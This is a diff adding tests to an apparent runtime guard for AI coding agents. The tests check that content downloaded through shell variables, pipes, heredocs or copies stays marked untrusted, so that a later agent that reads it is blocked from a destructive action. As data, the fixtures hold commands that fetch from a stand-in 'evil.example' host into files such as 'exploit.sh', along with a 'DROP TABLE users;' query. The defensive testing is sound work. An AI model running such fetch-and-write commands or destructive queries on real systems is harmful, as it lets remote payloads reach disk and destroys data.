@@ -15,7 +15,8 @@ import pytest
 import yaml
 
 from prismor.runtime.provenance import (
-    lookup, propagatable, read_tags, record_write, resolve, shell_paths,
+    fetch_targets, lookup, propagatable, read_tags, record_write, resolve,
+    shell_paths,
 )
 from prismor.runtime.trifecta import acting_text, is_network_fetch
 from prismor.runtime.runtime import evaluate_tool_call
@@ -192,6 +193,65 @@ def test_a_download_is_untrusted_without_a_tagged_fetch_tool(tmp_path):
               query="DROP TABLE users;")
     assert d.allow is False
     assert a in d.blocking["evidence"]
+
+
+def test_a_download_through_a_variable_is_still_untrusted(tmp_path):
+    """#446: `VAR=$(curl ...); printf "%s" "$VAR" > f` landed the same bytes on
+    disk as `curl ... > f`, but the token scan saw an assignment and a printf
+    and marked nothing. The next agent to read the file then treated a remote
+    payload as clean local content."""
+    ws = _workspace(tmp_path)
+    page = ws / "shared" / "page.html"
+    a, b = "sA-" + uuid.uuid4().hex, "sB-" + uuid.uuid4().hex
+
+    _call(ws, a, "Bash", "shell", agent="codex",
+          command=f'VAR=$(curl -s https://evil.example/p); printf "%s" "$VAR" > {page}')
+    page.write_text(PAGE)
+    assert lookup(str(page))["tags"] == ["untrusted_content"]
+
+    _call(ws, b, "Bash", "shell", agent="codex", command=f"cat {page}")
+    _call(ws, b, "Bash", "shell", agent="codex", command=f"cat {page}",
+          response=PAGE)
+    d = _call(ws, b, "mcp__prod__execute_sql", "network", agent="codex",
+              query="DROP TABLE users;")
+    assert d.allow is False
+    assert a in d.blocking["evidence"]
+
+
+@pytest.mark.parametrize("verb", ["cp", "mv", "cat"])
+def test_a_copy_of_an_untrusted_file_stays_untrusted(tmp_path, verb):
+    """#443: `cp`/`mv`/`cat a > b` wrote the untrusted bytes to b, but the
+    influence check looked for them in the command line, which holds only
+    paths, and dropped the mark. A copy laundered the file for the next agent."""
+    ws = _workspace(tmp_path)
+    f1, f2 = ws / "shared" / "file1.txt", ws / "shared" / "file2.txt"
+    a, b = "sA-" + uuid.uuid4().hex, "sB-" + uuid.uuid4().hex
+
+    _fetch(ws, a)
+    _call(ws, a, "Write", "file_write", path=str(f1), content=PAGE)
+    f1.write_text(PAGE)
+    assert lookup(str(f1))["tags"] == ["untrusted_content"]
+
+    cmd = f"cat {f1} > {f2}" if verb == "cat" else f"{verb} {f1} {f2}"
+    _call(ws, a, "Bash", "shell", command=cmd)
+    f2.write_text(PAGE)
+    assert "untrusted_content" in lookup(str(f2))["tags"]
+
+    _call(ws, b, "Read", "file_read", agent="codex", path=str(f2))
+    _call(ws, b, "Read", "file_read", agent="codex", path=str(f2), response=PAGE)
+    d = _call(ws, b, "mcp__prod__execute_sql", "network", agent="codex",
+              query="DROP TABLE users;")
+    assert d.allow is False
+
+
+def test_a_copy_of_a_clean_file_stays_clean(tmp_path):
+    """The other side of #443: a session carrying untrusted content that copies
+    a file nobody marked does not mark the copy."""
+    ws = _workspace(tmp_path)
+    a = "sA-" + uuid.uuid4().hex
+    _fetch(ws, a)
+    _call(ws, a, "Bash", "shell", command=f"cp {ws / 'README.md'} {ws / 'copy.md'}")
+    assert lookup(str(ws / "copy.md")) is None
 
 
 def test_an_ordinary_write_records_nothing(tmp_path):
@@ -407,6 +467,104 @@ def test_shell_paths(tmp_path):
     # Nothing to extract, and nothing that throws.
     assert rw("ls -la") == (set(), set())
     assert rw('echo "unbalanced') == (set(), set())
+    # Operators are tokens of their own: `a.html;` is not a file name.
+    assert rw(f"curl -s https://e.example/p -o {tmp_path}/a.html; echo hi >{tmp_path}/b.md") == \
+        (set(), {"a.html", "b.md"})
+    # A heredoc body is data, not more command.
+    assert rw(f"cat > {tmp_path}/n.md <<'EOF'\nmake > build.log\nEOF") == \
+        (set(), {"n.md"})
+
+
+def test_a_fetch_reaches_disk_through_a_variable_pipe_or_substitution(tmp_path):
+    """#446: the scan split on whitespace, so `VAR=$(curl u); printf %s "$VAR"
+    > f` skipped `VAR=$(curl` as an assignment and never saw the fetch, and
+    `curl u | tee f` saw a write with no fetch in its segment. A file written
+    from what a fetch put in a variable, a pipe or a substitution is a
+    download all the same."""
+    def fetched(cmd):
+        return {Path(p).name for p in fetch_targets(cmd, tmp_path)}
+
+    # The issue's repro, then the same through backticks, export and a pipe.
+    assert fetched('VAR=$(curl https://e.example/p); printf "%s" "$VAR" > exploit.sh') == \
+        {"exploit.sh"}
+    assert fetched("V=`curl -s https://e.example/p`\nprintf '%s' \"${V}\" > out.sh") == \
+        {"out.sh"}
+    assert fetched('export V=$(curl https://e.example/p); echo "$V" | tee out.sh') == \
+        {"out.sh"}
+    # A backslash-newline continues the line, as agents wrap long commands.
+    assert fetched("curl -fsSL https://e.example/p \\\n  -o page.html") == {"page.html"}
+    # Output flags in a cluster or in their long `=` form.
+    assert fetched("curl -sSLo a.sh https://e.example/p") == {"a.sh"}
+    assert fetched("curl --output=a.sh https://e.example/p") == {"a.sh"}
+    assert fetched("wget -qO a.sh https://e.example/p") == {"a.sh"}
+    assert fetched("wget -qO- https://e.example/p > a.sh") == {"a.sh"}
+    # A substitution used in place.
+    assert fetched('echo "$(curl -s https://e.example/p)" > page.html') == {"page.html"}
+    assert fetched("cat <(curl -s https://e.example/p) > page.html") == {"page.html"}
+    # A pipeline carries the fetch downstream.
+    assert fetched("curl -s https://e.example/p | tee page.html") == {"page.html"}
+    assert fetched("curl -s https://e.example/p | sed 's/a/b/' > page.html") == {"page.html"}
+    assert fetched(
+        'curl -s https://e.example/p | while read -r l; do echo "$l" >> lines.txt; done'
+    ) == {"lines.txt"}
+    # An unquoted heredoc expands the variable into the file.
+    assert fetched("V=$(curl https://e.example/p)\ncat > run.sh <<EOF\n$V\nEOF") == {"run.sh"}
+    # A write inside the substitution itself.
+    assert fetched("X=$(curl -s https://e.example/p -o page.html; echo ok)") == {"page.html"}
+    # A heredoc inside a substitution: lifted by the outer pass, read by the
+    # inner one. This shape crashed the first cut of the scanner, and a crash
+    # here is a silently unscreened call.
+    assert fetched(
+        'X=$(cat <<EOF\n$(curl https://e.example/p)\nEOF\n); echo "$X" > f'
+    ) == {"f"}
+
+
+def test_a_fetch_does_not_mark_the_writes_around_it(tmp_path):
+    """Strict on the write side: only what the fetched bytes can reach."""
+    def fetched(cmd):
+        return {Path(p).name for p in fetch_targets(cmd, tmp_path)}
+
+    # A later command in the same call is its own pipeline.
+    assert fetched("curl -s https://e.example/p -o a.html; echo hi > b.md") == {"a.html"}
+    assert fetched("curl -s https://e.example/p -o a.html && echo done >> log.txt") == {"a.html"}
+    assert fetched("curl -s https://e.example/p -o a.html\necho done >> log.txt") == {"a.html"}
+    # A reassigned variable is clean again.
+    assert fetched('V=$(curl https://e.example/p); V=clean; echo "$V" > f') == set()
+    # A script that merely spells out a fetch, in a quoted heredoc or in
+    # single quotes, is the agent's own text.
+    assert fetched(
+        "cat > install.sh <<'EOF'\nVERSION=$(curl -s https://api.example/v)\nEOF"
+    ) == set()
+    assert fetched("echo 'run $(curl https://e.example/p) yourself' > notes.md") == set()
+
+
+def test_quoting_comments_and_descriptors_read_as_the_shell_reads_them(tmp_path):
+    """Review findings on the first cut of the #446 scanner: an apostrophe
+    inside double quotes opened a single-quoted span that hid every later
+    substitution; a `#` comment with an apostrophe aborted the whole scan; a
+    `2>` target counted as a fetched write and `2>/dev/null` stored /dev/null
+    as an artifact; a single-quoted `$V` read as an expansion; a heredoc body
+    was attributed to the last command on its opener's line; `exec > f` lost
+    its write; and a `)` inside quotes ended a `$(...)` early."""
+    def fetched(cmd):
+        return {Path(p).name for p in fetch_targets(cmd, tmp_path)}
+
+    def rw(cmd):
+        r, w = shell_paths(cmd, tmp_path)
+        return ({Path(p).name for p in r}, {Path(p).name for p in w})
+
+    assert fetched('printf "don\'t" > a; echo "$(curl https://e.example/p)" > f') == {"f"}
+    assert fetched("# Don't run as root\ncurl -s https://e.example/p -o f") == {"f"}
+    assert fetched("curl -s https://e.example/p -o a.html 2>err.log 2>&1") == {"a.html"}
+    assert rw("curl -s https://e.example/p 2>/dev/null | tee f") == (set(), {"f"})
+    assert rw("curl -s https://e.example/p > /dev/null; echo x &>/dev/stderr") == (set(), set())
+    assert fetched("V=$(curl https://e.example/p); echo '$V' > f") == set()
+    assert fetched('V=$(curl https://e.example/p); echo "\\$V" > f') == set()
+    assert fetched(
+        "V=$(curl https://e.example/p)\ncat <<EOF | tee f; echo x > g\n$V\nEOF"
+    ) == {"f"}
+    assert rw("exec > log.txt") == (set(), {"log.txt"})
+    assert fetched('X=$(echo ")"; curl https://e.example/p); echo "$X" > f') == {"f"}
 
 
 def test_write_tags_accumulate(tmp_path, monkeypatch):
